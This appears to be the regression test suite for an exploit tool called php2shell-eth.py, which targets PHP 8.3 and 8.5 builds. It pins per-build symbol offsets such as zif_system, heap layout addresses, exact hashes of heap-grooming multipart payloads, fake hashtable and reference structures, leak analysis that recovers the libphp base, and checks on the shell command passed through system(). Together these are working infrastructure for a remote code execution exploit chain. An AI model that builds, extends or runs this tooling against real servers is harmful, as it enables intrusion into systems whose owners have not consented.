from __future__ import annotations

import hashlib
from importlib import import_module
from pathlib import Path
from pkgutil import iter_modules
import subprocess
import sys
import unittest


ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from a1 import A1_BOUNDARY, a1_parts
from a2b2 import (
    DEFAULT_COMMAND,
    a2_pieces,
    command_capacity,
    fake_hashtable,
    fake_reference,
    validate_command,
)
from b1 import analyse, make_body
from common import iter_multipart
import profiles as profile_package
from profiles import DEFAULT_PROFILE, PROFILES


class ProfileRegressionTests(unittest.TestCase):
    def setUp(self) -> None:
        self.profile = PROFILES[DEFAULT_PROFILE]

    def test_registered_profiles_are_complete(self) -> None:
        for profile in PROFILES.values():
            profile.validate()

    def test_empty_cli_prints_help_without_contacting_a_target(self) -> None:
        result = subprocess.run(
            [sys.executable, str(ROOT / "php2shell-eth.py")],
            cwd=ROOT,
            capture_output=True,
            text=True,
            timeout=5,
            check=False,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("usage:", result.stdout)
        self.assertNotIn("Traceback", result.stderr)

    def test_profile_modules_are_discovered_automatically(self) -> None:
        module_names = sorted(
            module.name
            for module in iter_modules(profile_package.__path__)
            if not module.ispkg
            and module.name != "types"
            and not module.name.startswith("_")
        )
        self.assertEqual(len(PROFILES), len(module_names))
        for module_name in module_names:
            module = import_module(f"profiles.{module_name}")
            self.assertIs(PROFILES[module.PROFILE.name], module.PROFILE)

    def test_effective_ini_contract_is_explicit(self) -> None:
        expected = dict(self.profile.environment.ini_settings)
        self.assertEqual(expected["session.sid_length"], "26")
        self.assertEqual(expected["session.sid_bits_per_character"], "5")
        self.assertEqual(expected["display_errors"], "Off")

        no_ini = PROFILES["php-8.3.35-arm64-official-no-ini"]
        no_ini_expected = dict(no_ini.environment.ini_settings)
        self.assertEqual(no_ini_expected["loaded_configuration_file"], "(none)")
        self.assertEqual(no_ini_expected["session.sid_length"], "32")
        self.assertEqual(no_ini_expected["display_errors"], "On")

    def test_amd64_profile_contract_is_registered(self) -> None:
        arm64 = PROFILES["php-8.3.35-arm64-official"]
        amd64 = PROFILES["php-8.3.35-amd64-official"]

        self.assertEqual(amd64.environment.architecture, "x86_64")
        self.assertEqual(
            amd64.environment.image_id,
            "sha256:90620e863c15e608cfebd058554d82d2c7fd816bdd690adc69027409cbb7a369",
        )
        self.assertEqual(
            amd64.environment.libphp_sha256,
            "ea069762fa225a2d61ebf613db5686d7c29823acf641424d596f78fcaa1cdccb",
        )
        self.assertEqual(amd64.symbols.zval_ptr_dtor, 0x49EC50)
        self.assertEqual(amd64.symbols.zif_system, 0x3AC080)
        self.assertEqual(amd64.abi, arm64.abi)
        self.assertEqual(amd64.allocator, arm64.allocator)
        self.assertEqual(amd64.heap, arm64.heap)
        self.assertEqual(amd64.a1, arm64.a1)
        self.assertEqual(amd64.b1, arm64.b1)
        self.assertEqual(amd64.a2, arm64.a2)
        self.assertEqual(amd64.b2, arm64.b2)

    def test_php857_arm64_no_ini_contract_is_registered(self) -> None:
        profile = PROFILES["php-8.5.7-arm64-official-no-ini"]
        self.assertEqual(profile.environment.architecture, "aarch64")
        self.assertEqual(profile.environment.php_version, "8.5.7")
        self.assertEqual(
            profile.environment.image_id,
            "sha256:e220f33a0424c959ce19f2663d9bdcc3857b3a80e1eef4216cc1dd10bad787c7",
        )
        self.assertEqual(
            profile.environment.libphp_sha256,
            "c1d55f31423d01b7c093be31973650b0aafa475be9f67bfee3b430d4a2cab222",
        )
        self.assertEqual(profile.symbols.zval_ptr_dtor, 0x75CC00)
        self.assertEqual(profile.symbols.zif_system, 0x52C030)
        self.assertEqual(profile.heap.stale_session_id, 0x71F00)
        self.assertEqual(profile.heap.stale_session_reference, 0x79760)
        self.assertEqual(profile.heap.fake_array, 0xF4398)

    def test_php857_profile_dense_main_recovery_is_opt_in(self) -> None:
        profile = PROFILES["php-8.5.7-arm64-official-no-ini"]
        main = 0x0000F00000000000
        libphp = main - 0x3400000
        dtor = libphp + profile.symbols.zval_ptr_dtor
        pointers = [main + 0x1000 + 8 * index for index in range(1000)]
        pointers.extend([dtor] * 2000)
        disclosure = profile.b1.marker + b"".join(
            value.to_bytes(8, "little") for value in pointers
        )

        info = analyse(
            disclosure,
            profile.symbols.zval_ptr_dtor,
            profile.heap.stale_session_id,
            abi=profile.abi,
            allocator=profile.allocator,
            marker=profile.b1.marker,
        )

        self.assertEqual(info["request_main_base"], main)
        self.assertEqual(info["main_recovery"], "profile_dense_pointer_cluster")
        self.assertEqual(info["libphp_candidates"][0]["base"], libphp)

    def test_payloads_remain_byte_identical_after_profile_split(self) -> None:
        p = self.profile
        a1 = p.a1
        a1_body = b"".join(iter_multipart(a1_parts(
            sid_size=a1.sid_size,
            sid_late=a1.sid_late,
            files=a1.files,
            depth=a1.depth,
            live_files=a1.live_files,
            ct1=a1.content_type_1,
            ct2=a1.content_type_2,
            fillers=a1.fillers,
            filler_name=a1.filler_name,
            filler_value=a1.filler_value,
            big=a1.big,
            big_size=a1.big_size,
            big_name=a1.big_name,
            big_name_count=a1.big_name_count,
            big_alt_name=a1.big_alt_name,
            tail_big_size=a1.tail_big_size,
            tail_big_count=a1.tail_big_count,
            burners=a1.burners,
            burner_size=a1.burner_size,
            burner_name=a1.burner_name,
            burner_long_name_count=a1.burner_long_name_count,
            burner_long_name=a1.burner_long_name,
            late_groom_fields=a1.late_groom_fields,
            late_groom_name=a1.late_groom_name,
            late_groom_value=a1.late_groom_value,
            late_groom_alt_value_count=a1.late_groom_alt_value_count,
            late_groom_alt_value=a1.late_groom_alt_value,
            released_fields=a1.released_fields,
            released_name=a1.released_name,
            released_value=a1.released_value,
            released_alt_value_count=a1.released_alt_value_count,
            released_alt_value=a1.released_alt_value,
            released_replacement_value=a1.released_replacement_value,
            released_long_replacement_count=a1.released_long_replacement_count,
            released_long_replacement_value=a1.released_long_replacement_value,
            progress_size=a1.progress_size,
        ), A1_BOUNDARY))

        b1 = p.b1
        b1_body = make_body(
            b"codex843b1",
            p.heap.stale_session_id,
            b1.fake_length,
            b1.sprays,
            b1.data_start,
            b1.nested_fields,
            b1.nested_depth,
            b1.small_fields,
            b1.small_name_size,
            b1.small_value_size,
            b1.small_after_nested,
            b1.page_spec,
            b1.tail_pages,
            b1.release_sprays,
            b1.carrier_sprays,
            b1.carrier_pages,
            abi=p.abi,
            allocator=p.allocator,
            gc_refcount=b1.fake_string_gc_refcount,
            gc_type=b1.fake_string_gc_type,
            string_hash=b1.fake_string_hash,
            marker=b1.marker,
        )

        a2_body = b"".join(a2_pieces(p.a2.parts, p.a2.depth, p.a2.fillers))
        reference = fake_reference(
            0x1122334455667788,
            p.b2.value_length,
            p.b2.reference_refcount,
            abi=p.abi,
        )
        hashtable = fake_hashtable(
            0x10000000,
            0x20000000,
            p.b2.value_length,
            abi=p.abi,
            marker_command=DEFAULT_COMMAND,
        )

        fixtures = (
            (a1_body, 991644, "048b3e2ebd43e3033a62bd458eb953ef88d0811ecfe4e72780273425cc835a95"),
            (b1_body, 38280881, "2d3581e96dbe5030c39f56f8a813e74602623be9f4abbc54b67395476117acb9"),
            (a2_body, 242504, "d948923e710da617322f1af8805ca6ce75fc754a2c11496e7c64ead6aa23dd3a"),
            (reference, 384, "73d91c078e67279d1e381be9ec0d8d2ec6633d8f0ec2c862afb021e1b73381b4"),
            (hashtable, 384, "86137dabe3abf9c493062a635d8d6d272b569fd925c3584b1b687739026d4085"),
        )
        for payload, expected_length, expected_hash in fixtures:
            self.assertEqual(len(payload), expected_length)
            self.assertEqual(hashlib.sha256(payload).hexdigest(), expected_hash)

    def test_runtime_command_is_not_profile_data(self) -> None:
        p = self.profile
        capacity = command_capacity(p.b2.value_length, p.abi)
        validate_command(b"id", p.b2.value_length, p.abi)
        validate_command(b"A" * capacity, p.b2.value_length, p.abi)
        with self.assertRaises(ValueError):
            validate_command(b"", p.b2.value_length, p.abi)
        with self.assertRaises(ValueError):
            validate_command(b"a\0b", p.b2.value_length, p.abi)
        with self.assertRaises(ValueError):
            validate_command(b"A" * (capacity + 1), p.b2.value_length, p.abi)


if __name__ == "__main__":
    unittest.main()
